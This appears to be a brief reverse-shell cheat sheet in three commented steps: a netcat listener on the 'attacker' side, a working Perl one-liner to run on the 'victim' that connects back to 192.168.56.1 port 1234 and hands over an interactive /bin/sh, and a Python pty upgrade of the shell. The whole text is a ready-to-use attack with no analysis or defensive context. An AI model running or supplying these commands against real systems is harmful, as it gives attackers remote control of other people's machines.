# Step 1
# run on attacker
# nc -lnvp 1234

# Step 2
# run on victim
perl -e 'use Socket;$i="192.168.56.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Step 3
# run on attacker
# python -c 'import pty;pty.spawn("/bin/bash")'
